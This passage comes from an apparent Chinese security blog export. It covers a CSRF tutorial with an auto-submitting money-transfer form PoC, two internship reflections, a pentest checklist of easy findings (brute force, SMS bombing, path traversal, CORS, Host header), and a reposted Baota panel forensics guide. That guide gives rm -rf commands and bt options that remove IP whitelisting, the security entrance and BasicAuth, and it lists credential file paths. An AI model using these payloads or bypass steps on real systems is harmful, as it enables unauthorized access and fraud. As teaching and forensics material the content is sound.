<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;form action=&quot;http://192.168.1.123/give_money.php&quot;method=POST&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;user&quot; value=&quot;hacker&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;100&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>受害者访问该页面后,表单会自动提交,相当于模拟用户完成了post操作,当受害者点击了该页面后,就会受害者不知情的情况下给hacker转账100元.</p>
<p><strong>生成CSRF漏洞POC</strong></p>
<p>我们自己不想写的时候,可以利用burp直接生成CSRF漏洞POC</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B9%8BCSRF/640-165312578768628.png" alt="图片"></p>
<p>即可以帮我们生成CSRF的html</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E4%B9%8BCSRF/640-165312578768729.png" alt="图片"></p>
<p><strong>造成CSRF漏洞的原因</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.请求所有的参数均可确定</span><br><span class="line">2.请求的审核不严格,比如只验证了cookie</span><br></pre></td></tr></table></figure>

<p><strong>CSRF漏洞的检测</strong></p>
<p>最简单的办法就是使用burp抓取一个正常的请求包,然后发送到repeti模块,去掉数据包中的Referer字段,看请求能否正常执行,如果可以正常执行,则有可能存在CSRF漏洞</p>
<p><strong>CSRF漏洞存在的位置:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.评论处</span><br><span class="line">2.订阅处</span><br><span class="line">3.资料修改处</span><br><span class="line">4.密码更改处</span><br><span class="line">5.管理员添加处</span><br><span class="line">6.删除用户或者信息处</span><br></pre></td></tr></table></figure>

<p><strong>针对CSRF漏洞探测的工具:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.CSRFTester       </span><br><span class="line">2.burp中的插件</span><br></pre></td></tr></table></figure>

<p><strong>CSRF漏洞造成的危害</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.篡改目标网站上的用户数据信息；</span><br><span class="line">2.盗取用户隐私数据；</span><br><span class="line">3.配合XSS漏洞造成更大危害；</span><br><span class="line">4.传播CSRF蠕虫。</span><br></pre></td></tr></table></figure>

<p><strong>CSRF漏洞的防御:</strong></p>
<p>1.尽可能的使用POST请求</p>
<p>GET接口太容易被拿来做CSRF攻击，只要构造一个img标签，而img标签又是不能过滤的数据。接口最好限制为POST使用，GET则无效，降低攻击风险。当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性</p>
<p>2.添加验证码(对用户体验不太好)</p>
<p>虽然增加验证码能够很好遏制CSRF攻击，但是增加验证码降低了用户的体验，所以网站不可能给所有的操作都加上验证码，所以只能将验证码作为一种辅助的手段，在关键业务点设置验证码；</p>
<p>3.验证Referer(效果不太高)</p>
<p>但是这种办法的有效性不高，第一，可以抓包修改该字段；第二，在https跳转到http的情况下，浏览器出于安全考虑，不会发送referer，服务器就无法进行检查了，而且如果该网站同域的其他网站有XSS漏洞，那么攻击者可以在其他网站注入恶意脚本，受害者进入了此类同域的网址，也会遭受攻击。所以说有效性不高。（不靠谱的原因是服务器并不是随时都能获得Referer，只能监控是否发生，并且不能防范统一域上的CSRF攻击）</p>
<p>4.添加token,对token进行验证</p>
<p>也就是发送请求时在HTTP请求中以参数的形式加入一个随机产生的token（一次性随机值），并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域Cookie中这个token值，会进行校验该请求当中的token和Cookie当中的token值是否都存在且相等，当判断出存在且相等才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。</p>
<p>5.请求做二次确认</p>
<p>比如黑客用CSRF让你转账，但是这个时候提示你——是否转账？，或者让你输入验证码什么的，提醒你的误操作，就可以有效防止CSRF</p>
<p><strong>XSS与CSRF的组合拳</strong></p>
<p>如果一个网站同时存在xss与csrf漏洞,那么攻击者就可以把csrf利用链接填入到存在xss漏洞的地方,从而增大攻击成功的可能性,一定程度上也可以绕过服务端对Referer的验证.</p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>安服实习有感</title>
    <url>/posts/be023eb.html</url>
    <content><![CDATA[<h2 id="🛀-心态"><a href="#🛀-心态" class="headerlink" title="🛀 心态"></a>🛀 心态</h2><p>随着时间的推移，火山会渐渐熄灭，激情同样如此，在激情消退的同时，会感到有点疲惫，不再是做什么都会是活力满满的样子。</p>
<p>重复的事情做多了，会感到倦怠。</p>
<p>上述心态的转变，是必然的结果，时间长短的问题而已。</p>
<p>所以，我们需要以平常心来对待这件事，如何重新燃起激情？</p>
<p>工作中还有很多未知的挑战，做一件事，复盘一件事，你会发现很多小细节，很多有趣的事情，思考如何将一件事做的更好，如何避免繁琐的流程，你去优化这件事，然后做到了，然后分享出来，这就是你最初的激情。</p>
<p>与此同时，我们应该积极主动的去学习，因为有实力的人才有选择生活的能力。✊</p>
<p><strong>路漫漫其修远兮，吾将上下而求索。</strong></p>
<h2 id="🏄‍♂️-生活"><a href="#🏄‍♂️-生活" class="headerlink" title="🏄‍♂️ 生活"></a>🏄‍♂️ 生活</h2><p>一成不变的生活不仅会影响到工作中的激情，还会让我们变得更加疲惫，无论是物理上的，还是精神上的。</p>
<p>在生活的同时，我们可以做出一点改变，去做一些新鲜的事情，培养一点小众的爱好。</p>
<p>做什么都好，让生活变得非常规就好。</p>
<h2 id="🚀-better"><a href="#🚀-better" class="headerlink" title="🚀 better"></a>🚀 better</h2><p>实习有一个月了，算是从一个学生转变成半个打工人了。</p>
<p>在实习期间，算是明白了该怎么做的更好。</p>
<p>一个是需要经常出差，很难再有充沛的时间去提升自己，所以我觉得在出差的时候就应该完成好工作之后放松自己，该玩的玩。</p>
<p>然后在公司的时候，努力去提升自己，减少娱乐时间，将娱乐留到出差的时候。</p>
<p>开源一个实用意义的项目，维护它，使它变得更好，你会从中学到很多知识，获得成就感。</p>
<h2 id="🤺-写在最后"><a href="#🤺-写在最后" class="headerlink" title="🤺 写在最后"></a>🤺 写在最后</h2><p>生活允许自己成为自己，生活允许每个人有选择的权力。</p>
<p>你可以孤独的活，那也是一种幸福。</p>
<p>记录生活，保持思考，保持分享欲，这是你最后的底线。</p>
<hr>
]]></content>
      <categories>
        <category>实习系列</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>安服实习第二个月</title>
    <url>/posts/7f7a10a4.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实习两个月了都，本来第二个月有很多感触的，但是被国庆假期憋没了，只剩下一点了，随便写写吧，以一个新人的视角。</p>
<h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><p>第二个月的实习时间大部分都是在渗透测试，是针对企业的小程序，网站，app，c&#x2F;s客户端等的渗透测试，不是开局一个登录框，拿到shell的工作，会提供部分账号，根据资产清单的ip&#x2F;url来进行渗透测试。</p>
<p>所以这和hw、src那些渗透测试又有些不同，你不需要进行信息收集的工作，如果可以，还能让管理员把你的ip加到waf的白名单，算是低级难度的渗透测试。</p>
<p>经过大量的实践，算是了解和认清了自己的工作，逐渐改进了自己的方法论和形成了一套规范化的渗透测试流程。</p>
<p>逻辑漏洞的增删改点点点，抓包放包改包，有输入回显的地方就插插插，没有waf的直接上xray扫扫扫，渗透测试报告编写的整齐规范。</p>
<p>在工作过程中认识到这不过是一个重复搬砖的过程。</p>
<p>我能搬的砖别人也能搬，别人能搬的砖，我也能搬，搬的好不好取决于你的经验和熟练度。</p>
<p>挖洞的尽头是没有尽头。</p>
<h2 id="我能做什么"><a href="#我能做什么" class="headerlink" title="我能做什么"></a>我能做什么</h2><p>说实话，有些事情我不是很理解，很多明明很多能够通过自动化来完成的事情，还要通过手工来完成。</p>
<p>比如渗透测试报告的编写，这是一件很烦人的事，比如一个客户，存在十几个测试系统，每个系统都有那么几个漏洞。根据模板，需要修改渗透测试系统的名称，漏洞名称，漏洞数量，ctrl+c,ctrl+v漏洞说明、漏洞危害、修复建议。贴几张图你看看就懂了，画线部分都是需要修改的。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/安服实习第二个月/image-20221005214644437.png" alt="image-20221005214644437" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/安服实习第二个月/image-20221005215032548.png" alt="image-20221005215032548" style="zoom:50%;" />

<p>我寻思这渗透测试也不是第一天了，为什么就不能撸一个渗透测试报告自动生成工具，把时间浪费在编写渗透测试报告这件事上，浪费在规范格式这种事情上，真的无法理解。</p>
<p>所以在处理这件事上，我写了一个渗透测试报告自动生成脚本，只需填写模板docx文件，填写一些简单的配置信息，它就能快速的生成规范统一的报告，这大大的减少了工作量。</p>
<p>当然脚本自动化的程度取决于公司能不能用统一的渗透测试报告模板（吐槽）。</p>
<p>然后是针对逻辑漏洞的增删改，点点点，打算写一个类似xray的工具，通过被动扫描的方式，自动增删改一些数据包， 实现一些手工测试工作，当然了，现在的想法还不是很成熟，需要克服的困难很多，任重而道远，但是为了实现自动化渗透测试，还是要去做的。</p>
<p>后面会写一篇安服水漏洞的文章，帮助新人快速入门低级渗透测试，快速挖到漏洞交差。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>怎么说呢，立足当下吧，把简单的事做好。</p>
]]></content>
      <categories>
        <category>实习系列</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试水漏洞清单</title>
    <url>/posts/3bae2a35.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为行业新人，刚开始漏洞挖掘的时候可能会存在一定程度的不适应，因为只挖高危漏洞的你，往往不会重视鸡肋漏洞的挖掘，比如用户名密码爆破、url跳转等，然而这些漏洞都是可以作为漏洞提交的。</p>
<p>所以本篇文章就是一个水漏洞的清单，关注面是你平时不关注的漏洞，<strong>只关注如何水漏洞</strong>，其他常见漏洞的挖掘方法就不写了。</p>
<p>强烈推荐水漏洞神器xray，让你拳打xss，脚踢cors。</p>
<h3 id="口令明文传输"><a href="#口令明文传输" class="headerlink" title="口令明文传输"></a>口令明文传输</h3><p>没有加密就进行传输了。</p>
<p>例如：</p>
<p>username&#x3D;admin&amp;password&#x3D;admin</p>
<h3 id="用户名、密码爆破"><a href="#用户名、密码爆破" class="headerlink" title="用户名、密码爆破"></a>用户名、密码爆破</h3><p>随便爆破，看看爆破响应包有没有回显信息，提示账号不存在等。</p>
<p>如果密码是明文传输，提示用户名或者密码错误，可以设置一个超长的密码，去爆破用户名，根据响应时间确定用户名。</p>
<h3 id="账户弱锁定-x2F-账号恶意锁定"><a href="#账户弱锁定-x2F-账号恶意锁定" class="headerlink" title="账户弱锁定&#x2F;账号恶意锁定"></a>账户弱锁定&#x2F;账号恶意锁定</h3><p>实在找不到的时候就爆破一下账号吧，不锁定就成功，锁定了就是账号恶意锁定漏洞，正反手都是无敌的。当然前提是你得有已知的账号和密码。</p>
<h3 id="短信炸弹"><a href="#短信炸弹" class="headerlink" title="短信炸弹"></a>短信炸弹</h3><p>输入手机号码，burp抓包，使用爆破模块发包，线程50，冲。</p>
<h3 id="验证码失效"><a href="#验证码失效" class="headerlink" title="验证码失效"></a>验证码失效</h3><p>验证码可以重复使用</p>
<p>这个我还没遇到过😓。</p>
<h3 id="目录穿越漏洞"><a href="#目录穿越漏洞" class="headerlink" title="目录穿越漏洞"></a>目录穿越漏洞</h3><p>看到 filename&#x3D;xxxxx.jpg 的url</p>
<p>尝试 filename&#x3D;..&#x2F;imgs&#x2F;xxxxx.jpg 能不能访问。</p>
<h3 id="通配符注入"><a href="#通配符注入" class="headerlink" title="通配符注入"></a>通配符注入</h3><p>搜索框输入 <code>*</code> 号，看看能不能搜索全部</p>
<p>如果可以的话，尝试输入 <code>&#39;</code> <code>&quot;</code> 单双引号等，引发它报错，可能又是一个物理路径泄露漏洞。</p>
<h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><p>是我容易忽视的漏洞，post csrf不行就 change 成 get 型，使用burp生成csrf payload。</p>
<h3 id="url跳转漏洞"><a href="#url跳转漏洞" class="headerlink" title="url跳转漏洞"></a>url跳转漏洞</h3><p>适用burpsuite抓包查看，找到 <a href="https://xxx.com/?redirecturl=https://xxx.com/">https://xxx.com/?redirecturl=https://xxx.com/</a> 等样式的请求。</p>
<h3 id="cors跨域"><a href="#cors跨域" class="headerlink" title="cors跨域"></a>cors跨域</h3><p>1.查看响应头</p>
<p>查看ACAO响应头是否为具体的值以及ACAC响应头是否为true，如果是则判断是否对源进行限制</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://www.eval.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<p>2.判断是否对源进行限制</p>
<p>我们将Origin修改为任意的站定，查看返回的ACAO头是否变成和我们修改成的站点一样，如果是，则可能存在CORS跨域资源共享。如下修改为baidu，ACAO也变为baidu，可能存在跨域问题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Origin: https://baidu.com</span><br></pre></td></tr></table></figure>

<p>3.判断是否对Referer值进行校验，或者是否添加token</p>
<h3 id="删除替换token"><a href="#删除替换token" class="headerlink" title="删除替换token"></a>删除替换token</h3><p>有token删token，有两个token就替换token，然后发包。</p>
<p>在一次漏洞挖掘中，请求加了token，但是删了token仍然可以访问。</p>
<h3 id="Host头注入"><a href="#Host头注入" class="headerlink" title="Host头注入"></a>Host头注入</h3><p>设置Host头，发出请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host: www.baidu.com</span><br></pre></td></tr></table></figure>

<p>返回包中包含如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Location: http://baidu.com</span><br></pre></td></tr></table></figure>

<p>或者拼接到html源码中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script src=&quot;http://www.baidu.com/js/jquery.js&quot;</span><br></pre></td></tr></table></figure>



<h3 id="请求协议未限制"><a href="#请求协议未限制" class="headerlink" title="请求协议未限制"></a>请求协议未限制</h3><p>修改请求方法未其他，</p>
<p>响应如下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%89%E6%9C%8D%E6%B0%B4%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/image-20221101094220007.png" alt="image-20221101094220007"></p>
<h3 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h3><p>注销后cookies是否有效等</p>
<h3 id="jQuery低版本漏洞"><a href="#jQuery低版本漏洞" class="headerlink" title="jQuery低版本漏洞"></a>jQuery低版本漏洞</h3><p>JQuery跨站脚本漏洞</p>
<p>影响版本：</p>
<p>jquery-1.7.1~1.8.3 jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js jquery-1.5所有版本 jquery-1.4所有版本 jquery-1.3所有版本 jquery-1.2所有版本</p>
<h3 id="内网IP地址泄露"><a href="#内网IP地址泄露" class="headerlink" title="内网IP地址泄露"></a>内网IP地址泄露</h3><p>内网 ip 硬编码在源码中。</p>
<h3 id="js-map文件没删导致的源码泄露"><a href="#js-map文件没删导致的源码泄露" class="headerlink" title="js.map文件没删导致的源码泄露"></a>js.map文件没删导致的源码泄露</h3><p>webpack打包的站点，没删js.map文件，可以还原源码。</p>
<h3 id="多点认证缺陷"><a href="#多点认证缺陷" class="headerlink" title="多点认证缺陷"></a>多点认证缺陷</h3><p>同一个账号不应该可以同时登录。</p>
<p>尝试使用两个浏览器登录同一个账号，如果能同时登录，就存在漏洞。</p>
<h3 id="Sql语句泄露"><a href="#Sql语句泄露" class="headerlink" title="Sql语句泄露"></a>Sql语句泄露</h3><p>提交请求之后，sql异常，在响应包中返回了sql查询语句，表名和字段等。</p>
<h3 id="测试例子页面泄露"><a href="#测试例子页面泄露" class="headerlink" title="测试例子页面泄露"></a>测试例子页面泄露</h3><p>比如Apache Tomcat Examples 页面没删除。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有点水，但不算太水，还有更水的不好意思写出来。</p>
<p>暂时只有这些水漏洞，其他想起来了再补充。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>宝塔面板取证</title>
    <url>/posts/2c6b3c44.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/YUmk2UPzbQqAJbQJQ8wepQ">https://mp.weixin.qq.com/s/YUmk2UPzbQqAJbQJQ8wepQ</a></p>
<p>作者：技术专家 罗冲冲 盘古石取证</p>
<p>编者荐语：</p>
<p>十个站点九个宝塔面板，足以说明宝塔的流行。</p>
<p>未知防焉知攻。</p>
<p>我们需要了解宝塔面板的使用方法和配置，才能快速进行渗透。</p>
<p>下面一文详细介绍了宝塔面版的各项配置和文件位置，可以帮助我们学习到宝塔的相关知识。</p>
</blockquote>
<h2 id="宝塔面板是什么？"><a href="#宝塔面板是什么？" class="headerlink" title="宝塔面板是什么？"></a><strong>宝塔面板是什么？</strong></h2><p>宝塔Linux面板是提升运维效率的服务器管理软件，支持一键LAMP&#x2F;LNMP&#x2F;集群&#x2F;监控&#x2F;网站&#x2F;FTP&#x2F;数据库&#x2F;JAVA等100多项服务器管理功能。例如:创建管理网站，轻松简单完成各种配置; 一键创建数据库，一键设置备份还原；方便高效的文件管理器，支持上传、下载、打包、解压以及文件编辑查看等。由此可见，宝塔面板一键管理服务器操作简单便捷，使得一些涉案服务器也使用宝塔面板进行管理。</p>
<h3 id="一-宝塔面板目录结构"><a href="#一-宝塔面板目录结构" class="headerlink" title="一. 宝塔面板目录结构"></a><strong>一. 宝塔面板目录结构</strong></h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976906208836.jpeg" alt="图片"></p>
<ol>
<li><p>Backup目录是宝塔面板的备份文件目录，保存数据库备份、站点备份。</p>
</li>
<li><p>Server目录是宝塔面板的服务目录。</p>
</li>
<li><p>wwwlogs目录是站点日志目录，保存网站的访问日志及错误日志。</p>
</li>
<li><p>wwwroot目录是站点根目录，网站源码存放在目录下。</p>
</li>
</ol>
<h3 id="二、如何发现宝塔服务器是否使用了宝塔服务"><a href="#二、如何发现宝塔服务器是否使用了宝塔服务" class="headerlink" title="二、如何发现宝塔服务器是否使用了宝塔服务"></a><strong>二、如何发现宝塔服务器是否使用了宝塔服务</strong></h3><ol>
<li>当获取到服务器的真实IP地址后，在浏览器输入服务器IP地址，会出现报错页面。如下图所示：</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640.jpeg" alt="图片"></p>
<ol start="2">
<li>在服务器IP地址后加上宝塔面板的默认端口8888，当出现如下图所示时，说明此服务器使用了宝塔服务。注：如端口被修改，可通过简单的端口扫描来发现服务器开放了哪些端口，在通过IP地址加上可疑的端口进行测试来确定是否使用了宝塔服务。</li>
</ol>
<p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976922689138.jpeg" alt="图片"></p>
<h3 id="三、宝塔面板各种安全限制的解决方法"><a href="#三、宝塔面板各种安全限制的解决方法" class="headerlink" title="三、宝塔面板各种安全限制的解决方法"></a><strong>三、宝塔面板各种安全限制的解决方法</strong></h3><h4 id="1-BasicAuth认证"><a href="#1-BasicAuth认证" class="headerlink" title="1.BasicAuth认证"></a>1.BasicAuth认证</h4><p>宝塔服务开启BasicAuth认证时，需要输入用户名和密码，如下图。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785431.jpeg" alt="图片"></p>
<p>方法一：用户名和密码保存在&#x2F;www&#x2F;server&#x2F;panel&#x2F;config&#x2F;basic_auth.json 文件中,用户名和密码加密方式为MD5。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785432.jpeg" alt="图片"></p>
<p>方法二：可以使用bt 23将BasicAuth认证关闭。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785443.png" alt="图片"></p>
<h4 id="2-IP访问限制"><a href="#2-IP访问限制" class="headerlink" title="2.IP访问限制"></a>2.IP访问限制</h4><p>设置的白名单IP保存在&#x2F;www&#x2F;server&#x2F;panel&#x2F;data&#x2F;limitip.conf 文件中。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785444.jpeg" alt="图片"></p>
<p>方法一：删除limitip.conf文件，命令：rm -rf  &#x2F;www&#x2F;server&#x2F;panel&#x2F;data&#x2F;limitip.conf 。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785445.jpeg" alt="图片"></p>
<p>方法二：可以使用bt 13取消ip访问限制。</p>
<h4 id="3-安全入口限制"><a href="#3-安全入口限制" class="headerlink" title="3.安全入口限制"></a>3.安全入口限制</h4><p>设置的8位字符的安全入口保存在&#x2F;www&#x2F;server&#x2F;panel&#x2F;data&#x2F;admin_path.pl 文件中。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785446.jpeg" alt="图片"></p>
<p>方法一：删除admin_path.pl文件，命令：rm -rf &#x2F;www&#x2F;server&#x2F;panel&#x2F;data&#x2F;admin_path.pl 。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785447.png" alt="图片"></p>
<p>方法二：bt 14查看 或者 bt 11删除安全入口。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785448.png" alt="图片"></p>
<h4 id="4-日志分析"><a href="#4-日志分析" class="headerlink" title="4.日志分析"></a>4.日志分析</h4><p>面板操作日志被清空或default.db的logs表被篡改或者删除宝塔的web请求日志记录在 &#x2F;www&#x2F;server&#x2F;panel&#x2F;logs&#x2F;request，可以查看日志进行分析。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-16597689785459.png" alt="图片"></p>
<h4 id="5-查看完整的宝塔账号"><a href="#5-查看完整的宝塔账号" class="headerlink" title="5.查看完整的宝塔账号"></a>5.查看完整的宝塔账号</h4><p>宝塔面板管理界面绑定宝塔账号是看到的是不完整的。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976897854510.png" alt="图片"></p>
<p>绑定的账号会记录在www&#x2F;server&#x2F;panel&#x2F;data&#x2F;userInfo.json 查看即可。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976897854511.png" alt="图片"></p>
<h3 id="四、宝塔面板数据"><a href="#四、宝塔面板数据" class="headerlink" title="四、宝塔面板数据"></a><strong>四、宝塔面板数据</strong></h3><h4 id="1-总览"><a href="#1-总览" class="headerlink" title="1.总览"></a>1.总览</h4><p>当我们登录到宝塔面板界面，首先要关注网站和数据库数据。可以通过网站和数据库来了解服务器的部署情况和备份数据。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976897854512.png" alt="图片"></p>
<h4 id="2-网站"><a href="#2-网站" class="headerlink" title="2.网站"></a>2.网站</h4><p>网站-备份站点-下载</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976897854513.png" alt="图片"></p>
<p>同时，在此页面很直观的就能看出服务器存在几个网站网址，方便我们对这些网站进行分析。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976897854614.png" alt="图片"></p>
<h4 id="3-数据库备份"><a href="#3-数据库备份" class="headerlink" title="3.数据库备份"></a>3.数据库备份</h4><p>数据库-备份数据库</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976897854615.png" alt="图片"></p>
<p>同时，在此页面也可获得到数据库的root密码，每个数据库的用户名和密码。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E5%8F%96%E8%AF%81/640-165976897854616.png" alt="图片"></p>
<h4 id="4-服务器搭建环境"><a href="#4-服务器搭建环境" class="headerlink" title="4.服务器搭建环境"></a>4.服务器搭建环境</h4><p>当我们在做网站重构时，服务器搭建环境相对来说是重要的，如果能得知服务器在搭建时，用的是什么数据库，服务器，版本信息等，那么我在重构时会事半功倍。</p>
<p>在宝塔面板页面中，可以通过在软件商店直接看面板下载了哪些环境。如下图就很直观的看到这个服务器使用的是常见的LNMP环境及其版本信息。那么在我们重构时，只需要去搭建配置相同的环境就可以相对较轻松地把网站搭建起来。</p>
